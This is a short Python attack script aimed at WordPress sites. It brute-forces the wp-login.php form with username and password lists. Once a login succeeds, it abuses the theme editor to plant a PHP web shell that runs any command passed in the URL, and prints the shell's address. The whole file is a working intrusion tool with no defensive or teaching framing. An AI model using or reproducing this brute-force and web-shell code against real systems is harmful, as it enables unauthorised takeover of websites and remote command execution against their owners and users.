import requests

def find_and_exploit_wordpress(url, username_list, password_list):
    # Get the username and password lists
    with open(username_list, "r") as user_file:
        usernames = user_file.readlines()
    with open(password_list, "r") as pass_file:
        passwords = pass_file.readlines()

    # Perform attack on WordPress site
    for username in usernames:
        for password in passwords:
            login_url = url + "/wp-login.php"
            data = {"log": username.strip(), "pwd": password.strip(), "wp-submit": "Log In", "redirect_to": url + "/wp-admin/"}
            session = requests.Session()
            response = session.post(login_url, data=data)
            if "wp-admin" in response.url:
                print("[+] Successfully logged in!")
                # Upload shell file
                shell_content = "<?php system($_GET['cmd']); ?>"
                shell_data = {"newcontent": shell_content, "file": "mini.php", "action": "update", "theme": "twentynineteen"}
                shell_url = url + "/wp-admin/theme-editor.php?file=mini.php"
                response = session.post(shell_url, data=shell_data)
                if "theme-editor.php" in response.text:
                    print("[+] Shell successfully uploaded:", url + "/wp-content/themes/twentynineteen/mini.php?cmd=id")
                    return
                else:
                    print("[-] Shell could not be uploaded.")
            else:
                print("[-] Could not log in.")

def main():
    url = input("Enter the URL of the WordPress site: ")
    username_list = "usr.txt"
    password_list = "password.txt"
    find_and_exploit_wordpress(url, username_list, password_list)

if __name__ == "__main__":
    main()
